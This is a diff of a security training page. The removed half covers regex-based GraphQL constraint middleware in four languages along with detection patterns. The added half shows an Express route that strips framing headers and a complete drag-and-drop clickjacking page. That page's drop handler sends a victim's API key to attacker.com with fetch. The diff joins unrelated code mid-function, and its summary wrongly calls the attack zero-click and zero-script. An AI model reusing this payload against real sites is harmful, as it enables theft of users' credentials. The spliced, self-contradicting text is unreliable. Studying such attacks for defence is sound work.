-new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
-```
-{% endtab %}
-
-{% tab title="Java" %}
-```regexp
-Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```regexp
-preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```regexp
-new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
-```
-{% endtab %}
-{% endtabs %}
-
-**Vulnerable Code Pattern**
-
-{% tabs %}
-{% tab title="C#" %}
-```csharp
-public class ConstraintValidationMiddleware
-{
-    private readonly FieldDelegate _next;
-    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();
-
-    public ConstraintValidationMiddleware(FieldDelegate next)
-    {
-        _next = next;
-    }
-
-    public async Task InvokeAsync(IMiddlewareContext context)
-    {
         // [1]
         // [2]
-        var field = context.Selection.Field;
-        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");
+        // The developer intentionally drops framing protection for "shareable" public links
+        if (req.path.startsWith('/public/share/')) {
+            res.removeHeader('X-Frame-Options');
+            res.removeHeader('Content-Security-Policy');
+        }
 
-        if (constraintDirective != null)
-        {
-            var pattern = constraintDirective.GetArgument<string>("pattern");
+        next();
+    }
+}
+
+// In the Profile Controller:
+router.get('/public/share/:id', async (req, res) => {
+    let profile = await Profile.findByPk(req.params.id);
+    
+    // [3]
+    // [4]
+    // Conditional rendering embeds highly classified data into the "public" 
+    // page if the active viewer happens to own the profile.
+    let privateApiKeyHtml = '';
+    if (req.user && req.user.id === profile.userId) {
+        privateApiKeyHtml = `<div id="secret-key">API_KEY: ${profile.apiKey}</div>`;
+    }
+
+    res.send(`
+        <html>
+            <body>
+                <h1>${profile.publicName}</h1>
+                ${privateApiKeyHtml}
+            </body>
+        </html>
+    `);
+});
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+\[1] The architecture features specific routes designed for public consumption and external integration, necessitating the deliberate removal of restrictive framing headers (`X-Frame-Options` and `frame-ancestors`), \[2] To maximize code reuse and avoid maintaining disparate templates for public vs. authenticated views, developers utilize conditional UI rendering, \[3] The architecture assumes that because an iframe is subject to the browser's strict Same-Origin Policy (SOP), a cross-origin attacker parent frame is mathematically prohibited from reading the DOM contents of the framed child window, \[4] The execution paradox. Developers conflated programmatic DOM access restrictions with physical API capabilities. While JavaScript cannot pierce the iframe boundary programmatically, the HTML5 Drag-and-Drop (DnD) specification explicitly allows data to traverse origins to facilitate native OS-level drag-and-drop operations. By selectively omitting framing headers on routes that conditionally display sensitive data, the backend provided the canvas. The attacker leverages UI Redressing not to induce a click, but to meticulously choreograph a physical drag sequence. The victim's own physical interaction bypasses the SOP, extracting the sensitive text from the invisible iframe and dropping it into the attacker's waiting JavaScript execution sink
+
+```http
+// 1. Attacker verifies that /public/share/profile lacks frame-ancestors.
+// 2. Attacker knows that if the profile owner views this page, their API key is 
+//    rendered at specific coordinates (e.g., top: 200px, left: 100px).
+// 3. Attacker constructs the complex Drag-and-Drop redressing payload:
+
+<html>
+<head>
+    <style>
+        #target-iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 800px; height: 600px;
+            opacity: 0.001; /* Invisible */
+            z-index: 10;
+        }
+        #fake-slider {
+            position: absolute;
+            top: 190px; left: 90px; /* Aligned over the API key */
+            width: 150px; height: 40px;
+            background: red; color: white; text-align: center;
+            z-index: 1; /* Underneath the iframe */
+        }
+        #attacker-dropzone {
+            position: absolute;
+            top: 190px; left: 500px;
+            width: 200px; height: 200px;
+            background: green;
+            z-index: 20; /* Above the iframe to catch the drop */
+        }
+    </style>
+</head>
+<body>
+    <div id="fake-slider">Drag me to the green box!</div>
+    <div id="attacker-dropzone">Drop here to verify!</div>
+    
+    <!-- The vulnerable endpoint -->
+    <iframe id="target-iframe" src="https://api.enterprise.tld/public/share/my-profile"></iframe>
+
+    <script>
+        const dropzone = document.getElementById('attacker-dropzone');
+        
+        // Allow dropping
+        dropzone.addEventListener('dragover', (e) => { e.preventDefault(); });
+        
+        // Intercept the data crossing the cross-origin boundary
+        dropzone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            const stolenData = e.dataTransfer.getData('text');
             
-            // [3]
-            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));
-
-            foreach (var argument in context.Selection.SyntaxNode.Arguments)
-            {
-                var inputString = argument.Value.ToString();
-                
-                // [4]
-                // Blocks the main GraphQL execution pipeline synchronously
-                if (!regex.IsMatch(inputString))
-                {
-                    context.ReportError("Constraint validation failed.");
-                    return;
-                }
-            }
-        }
-
-        await _next(context);
-    }
-}
-```
-{% endtab %}
-
-{% tab title="Java" %}
-```java
-public class ConstraintValidationMiddleware {
-
-    private final FieldDelegate next;
-
-    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();
-
-    public ConstraintValidationMiddleware(FieldDelegate next) {
-        this.next = next;
-    }
-
-    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {
-
-        // [1]
-        // [2]
-        Field field = context.getSelection().getField();
-
-        Directive constraintDirective = field.getDirectives()
-                .stream()
-                .filter(d -> d.getName().equals("constraint"))
-                .findFirst()
-                .orElse(null);
-
-        if (constraintDirective != null) {
-
-            String pattern = constraintDirective.getArgument("pattern");
-
-            // [3]
-            Pattern regex = compiledConstraints.computeIfAbsent(
-                    field.getName(),
-                    p -> Pattern.compile(pattern)
-            );
-
-            for (Argument argument : context.getSelection()
-                    .getSyntaxNode()
-                    .getArguments()) {
-
-                String inputString = argument.getValue().toString();
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!regex.matcher(inputString).matches()) {
-
-                    context.reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return CompletableFuture.completedFuture(null);
-                }
-            }
-        }
-
-        return next.invoke(context);
-    }
-}
-```
-
-
-{% endtab %}
-
-{% tab title="PHP" %}
-```php
-class ConstraintValidationMiddleware
-{
-    private $next;
-
-    private array $compiledConstraints = [];
-
-    public function __construct(callable $next)
-    {
-        $this->next = $next;
-    }
-
-
-    public function invokeAsync($context)
-    {
-        // [1]
-        // [2]
-        $field = $context->selection->field;
-
-        $constraintDirective = null;
-
-        foreach ($field->directives as $directive) {
-
-            if ($directive->name === "constraint") {
-                $constraintDirective = $directive;
-                break;
-            }
-        }
-
-
-        if ($constraintDirective !== null) {
-
-            $pattern = $constraintDirective
-                ->getArgument("pattern");
-
-
-            // [3]
-            if (!isset($this->compiledConstraints[$field->name])) {
-
-                $this->compiledConstraints[$field->name] =
-                    $pattern;
-            }
-
-            $regex = $this->compiledConstraints[$field->name];
-
-
-            foreach (
-                $context->selection
-                    ->syntaxNode
-                    ->arguments as $argument
-            ) {
-
-                $inputString = (string)$argument->value;
-
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!preg_match($regex, $inputString)) {
-
-                    $context->reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return null;
-                }
-            }
-        }
-
-
-        return call_user_func(
-            $this->next,
-            $context
-        );
-    }
-}
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```javascript
-const { ApolloGateway } = require('@apollo/gateway');
-
-class ConstraintValidationPlugin {
-    // [1]
-    // [2]
-    // Executes during Supergraph composition
-    requestDidStart({ schema }) {
-        const compiledRegexes = new Map();
-
-        // Recursively extract @constraint directives from the composed schema
-        Object.values(schema.getTypeMap()).forEach(type => {
-            if (type.astNode && type.astNode.directives) {
-                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
-                if (constraint) {
-                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
-                    if (patternArg) {
-                        // [3]
-                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
-                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
-                    }
-                }
-            }
+            // Exfiltrate the API key silently
+            fetch('https://attacker.com/leak?data=' + encodeURIComponent(stolenData));
+            dropzone.innerText = "Verified!";
         });
+    </script>
+</body>
+</html>
 
-        return {
-            async executionDidStart({ request }) {
-                // [4]
-                // Intercepts variables BEFORE passing the query to the Subgraph
-                for (const [key, value] of Object.entries(request.variables || {})) {
-                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
-                    if (regex && !regex.test(value)) {
-                        throw new Error(`Validation failed for ${key}`);
-                    }
-                }
-            }
-        };
-    }
-}
+// 4. The victim visits the attacker's page.
+// 5. The victim clicks on the red "Drag me" box. The browser registers the click 
+//    on the invisible API Key text within the enterprise iframe.
+// 6. The victim drags their mouse and releases it over the green "Drop here" box.
+// 7. The browser's native DataTransfer API ferries the selected API key out of the iframe 
+//    and hands it to the attacker's drop event listener.
+// 8. The attacker successfully reads the API key, breaking the Same-Origin Policy without XSS.
 ```
-{% endtab %}
-{% endtabs %}
+{% endstep %}
+
+{% step %}
+To support external content embedding, infrastructure engineers selectively disabled protective framing headers on public-facing routes. Concurrently, to optimize template management, they implemented state-dependent conditional rendering, embedding sensitive administrative artifacts into these "public" pages when viewed by authenticated owners. This optimization was predicated on the assumption that the browser's Same-Origin Policy (SOP) guaranteed read-isolation between nested cross-origin execution contexts. The security framework failed by overlooking the intentional, spec-compliant SOP bypass mechanics engineered into the HTML5 Drag-and-Drop API. The attacker weaponized this specification by constructing an invisible overlay and a deceptive kinetic puzzle. By guiding the victim through a precise physical interaction, the attacker forced the victim's browser to actively lift the highly classified data from the protected iframe and carry it across the origin boundary into the hostile execution context, resulting in a zero-click, zero-script data exfiltration via pure psychological and structural manipulation
 {% endstep %}
 {% endstepper %}
 
